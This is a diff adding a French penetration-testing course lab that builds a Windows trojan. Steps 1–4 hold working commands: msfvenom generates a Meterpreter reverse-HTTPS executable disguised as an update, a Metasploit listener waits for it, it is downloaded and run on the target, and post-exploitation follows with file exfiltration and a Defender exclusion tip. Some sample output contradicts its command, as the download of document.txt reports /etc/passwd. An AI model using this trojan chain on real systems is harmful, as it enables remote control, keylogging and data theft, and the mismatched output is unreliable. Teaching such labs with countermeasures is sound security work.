@@ -366,6 +366,206 @@ curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1%20OR%201=1"
 
 ---
 
+## Lab 3.4 — Trojan Windows : génération, livraison et reverse shell
+
+###  Fiche
+
+| Durée | Conteneur | Dossier | Techniques ATT&CK |
+|---|---|---|---|
+| 1h | VM Windows 10 + Kali | `~/cours-hacking/jour-3/labs/` | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) User Execution + [T1055](https://attack.mitre.org/techniques/T1055/) Process Injection + [T1071.001](https://attack.mitre.org/techniques/T1071/001/) Web Protocols |
+
+### Contexte métier
+
+Un trojan (ou cheval de Troie) est un logiciel malveillant déguisé en programme légitime. Dans un test de pénétration, l'auditeur peut être mandaté pour tester la capacité des employés à détecter une pièce jointe malveillante (simulation d'APT). Le trojan est livré via un fichier `.exe`, un document Office macro, ou un lien de téléchargement.
+
+**Positionnement :** Contrairement aux exploits des Labs 2.2-2.3 (vulnérabilités réseau), le trojan exploite le **facteur humain** : un utilisateur exécute volontairement le fichier. C'est la technique la plus utilisée dans les attaques réelles (Verizon DBIR : 74% des brèches impliquent l'humain).
+
+### Prérequis
+
+```bash
+cd ~/cours-hacking/jour-3/labs
+
+# 📌 Votre VM Windows 10 doit être allumée et sur le même réseau que Kali
+# Connectez-vous avec un compte administrateur local
+
+# 📌 Depuis Kali : relever votre IP (l'attaquant)
+echo "📌 IP Kali : $(hostname -I | awk '{print $1}')"
+
+# 📌 Depuis la VM Windows (PowerShell) : relever l'IP cible
+# ipconfig → noter l'adresse IPv4 (ex: 192.168.X.X)
+
+# 📌 Vérifier la connectivité : la VM doit pouvoir joindre Kali
+ping $(hostname -I | awk '{print $1}') -c 2
+# → 2 paquets reçus (la connectivité réseau est OK)
+
+# 📌 De même, depuis Kali, vérifier que vous joignez la VM
+# ping 192.168.X.X  (remplacer par l'IP de votre VM)
+```
+
+### Étape 1 — Génération du trojan avec msfvenom
+
+```bash
+cd ~/cours-hacking/jour-3/labs
+
+# 📌 msfvenom = générateur de payload de Metasploit
+# 🔍 -p windows/x64/meterpreter/reverse_https = payload 64-bit reverse HTTPS
+#   (Meterpreter = payload avancé avec injection mémoire, évasion, post-exploitation)
+# 🔍 LHOST = adresse IP de l'attaquant (Kali) — c'est là que le reverse shell se connecte
+# 🔍 LPORT = port d'écoute (443 = HTTPS, passe les firewalls)
+# 🔍 -f exe = format de sortie (exécutable Windows)
+# 🔍 -o = fichier de sortie
+echo "📌 Mon IP Kali (réseau local) : $(hostname -I | awk '{print $1}')"
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=$(hostname -I | awk '{print $1}') \
+  LPORT=443 \
+  -f exe \
+  -o /tmp/update_package.exe
+# → [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+# → [-] No arch selected, selecting arch: x64 from the payload
+# → No encoder specified, output size: 51200 bytes
+# → Saved as: /tmp/update_package.exe
+
+# 📌 Vérifier le fichier généré
+file /tmp/update_package.exe
+# → PE32+ executable (GUI) x86-64, for MS Windows  (c'est bien un PE Windows 64-bit)
+
+# 📌 Calculer l'empreinte (hash) pour vérification
+md5sum /tmp/update_package.exe
+# → abc123...  (empreinte unique du fichier)
+```
+
+**Checkpoint A :** Le fichier `update_package.exe` est un exécutable Windows 64-bit. C'est un trojan : déguisé en mise à jour, il contient le payload Meterpreter.
+
+### Étape 2 — Mise en place du listener Metasploit
+
+```bash
+cd ~/cours-hacking/jour-3/labs
+
+# 📌 Script de démarrage du handler Metasploit (multi/handler)
+# 🔍 use exploit/multi/handler = module générique qui attend une connexion reverse
+# 🔍 set PAYLOAD = même payload que celui généré par msfvenom
+# 🔍 set LHOST = IP de l'interface d'écoute (0.0.0.0 = toutes les interfaces)
+# 🔍 set LPORT = port d'écoute (443)
+# 🔍 set ExitOnSession = false = le handler continue d'écouter après une session
+# 🔍 exploit -j = lancer en tâche de fond (-j = job)
+cat > /tmp/listener.rc << 'EOF'
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set ExitOnSession false
+exploit -j
+EOF
+
+echo "📌 Lancement du handler en arrière-plan..."
+msfconsole -q -r /tmp/listener.rc
+# → [*] Started HTTPS reverse handler on https://0.0.0.0:443
+# → [*] https://0.0.0.0:443 handling request from ...
+```
+
+**💡 Alternative sans Metasploit :** Vous pouvez aussi utiliser `ncat --ssl -lvnp 443` pour un écouteur HTTPS minimal, mais Meterpreter offre plus de capacités (injection, screenshot, keylog).
+
+### Étape 3 — Livraison et exécution du trojan
+
+```bash
+cd ~/cours-hacking/jour-3/labs
+
+# 📌 Sur Kali : servir le trojan via HTTP
+# 🔍 python3 -m http.server = serveur HTTP minimal sur le port 8080
+# Le trojan est accessible à http://KALI_IP:8080/update_package.exe
+python3 -m http.server 8080 --directory /tmp/ &
+# → Serving HTTP on 0.0.0.0 port 8080 ...
+
+# 📌 Sur la VM Windows : télécharger et exécuter le trojan
+# Ouvrir PowerShell en administrateur et exécuter :
+# 🔍 Invoke-WebRequest = équivalent PowerShell de wget/curl
+# 🔍 Start-Process = lance l'exécutable
+: '
+Invoke-WebRequest -Uri http://KALI_IP:8080/update_package.exe `
+  -OutFile C:\Users\student\Desktop\update_package.exe
+Start-Process C:\Users\student\Desktop\update_package.exe
+'
+
+# 💡 Note : si Windows Defender bloque l'exécution, ajoutez une exclusion
+# de dossier avant (voir contre-mesure plus bas).
+```
+
+**Dans le terminal Metasploit** (quelques secondes après l'exécution) :
+
+```console
+[*] https://0.0.0.0:443 handling request from 192.168.X.X
+[*] Meterpreter session 1 opened (192.168.X.X:49152 → 192.168.X.X:443)
+meterpreter >
+```
+
+**Checkpoint B :** Une session Meterpreter est ouverte. Vous contrôlez la VM Windows 10 depuis Kali.
+
+### Étape 4 — Post-exploitation (collecte d'informations)
+
+```bash
+# 📌 Les commandes suivantes s'exécutent DANS Meterpreter (sur la cible)
+# 🔍 sysinfo = informations système (OS, architecture, domaine)
+# 🔍 getuid = utilisateur courant
+# 🔍 pwd = répertoire courant
+# 🔍 screenshot = capture d'écran du bureau
+# 🔍 keyscan_start = démarre le keylogger (enregistre les frappes)
+
+meterpreter > sysinfo
+# Computer        : DESKTOP-XXXXXXX
+# OS              : Windows 10 (10.0 Build 19045)
+# Meterpreter     : x64/windows
+
+meterpreter > getuid
+# Server username: DESKTOP-XXXXXXX\student
+
+meterpreter > pwd
+# C:\Users\student\Desktop
+
+# 📌 Télécharger un fichier depuis la cible vers Kali (exfiltration simulée)
+meterpreter > download C:\Users\student\Desktop\document.txt /tmp/exfiltrated.txt
+# → [*] Downloading: /etc/passwd -> /tmp/exfiltrated_passwd.txt
+
+# 📌 Nettoyer : supprimer le trojan de la cible
+meterpreter > rm C:\Users\student\Desktop\update_package.exe
+```
+
+**Checkpoint C :** Le trojan a collecté des informations système et exfiltré un fichier vers Kali. En conditions réelles, ces données seraient revendues ou utilisées pour pivoter.
+
+### 🔒 Contre-mesure (M1040 Endpoint Protection + M1037 User Training + M1029 AV Signature)
+
+| Attaque | Défense | Mise en œuvre |
+|---------|---------|---------------|
+| Trojan exécutable | **Windows Defender / EDR** (Antivirus nouvelle génération) | Activez Defender sur le poste Windows 10 |
+| Exécution par l'utilisateur | **Sensibilisation** + exécution restreinte (AppLocker) | `AppLocker → règles Chemins = C:\Program Files\` |
+| Reverse HTTPS sortant | **Proxy/filtrage DNS** + inspection SSL | Proxy avec MITM TLS (Zscaler, Palo Alto) |
+| Livraison HTTP | **Email filtering** + sandboxing | Attachment Scanning + pièces jointes `.exe` bloquées |
+
+```bash
+# 📌 Contre-mesure : analyser le trojan avec ClamAV (antivirus open-source)
+sudo apt install -y clamav 2>/dev/null
+sudo freshclam  # mettre à jour la base de signatures
+clamscan /tmp/update_package.exe
+# → /tmp/update_package.exe: Win.Trojan.MSIL-9876543 FOUND  (détecté !)
+
+# 📌 Sur la VM Windows 10 : Windows Defender détecte immédiatement le trojan
+# → Trojan:Win32/Meterpreter!ml  (détection par machine learning)
+
+# 💡 Pour le lab uniquement (à REMETTRE impérativement après) :
+# Ajouter une exclusion temporaire dans PowerShell Administrateur :
+#   Add-MpPreference -ExclusionPath C:\Users\student\Desktop\
+# Puis réactiver après le lab :
+#   Remove-MpPreference -ExclusionPath C:\Users\student\Desktop\
+# ⚠️ Ne pas laisser l'exclusion active après le TP
+
+# 📌 Auditer les règles AppLocker (simulation sous Linux) :
+# Les fichiers .exe ne devraient être autorisés que depuis C:\Program Files\
+echo "Règle AppLocker simulée : seuls les programmes signés sont autorisés"
+```
+
+> **Checkpoint défensif :** ClamAV et Windows Defender détectent le trojan Meterpreter. Un EDR (ex: CrowdStrike, SentinelOne) le bloquerait également, même si les signatures sont désactivées (détection comportementale).
+
+---
+
 ## Exercices
 
 ### Exercice 1 : Offset EIP avec GDB
@@ -437,6 +637,7 @@ cd /opt && gdb -q ./vuln
 - [Corelan Exploit Development](https://www.corelan.be/index.php/articles/)
 - [Awesome WAF](https://github.com/0xInfection/Awesome-WAF)
 - [CERT-FR](https://www.cert.ssi.gouv.fr/)
+- TryHackMe : [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep), [SQL Injection](https://tryhackme.com/room/sqlilab), [Windows Fundamentals](https://tryhackme.com/room/windowsfundamentals1xbx)
 
 ---
 
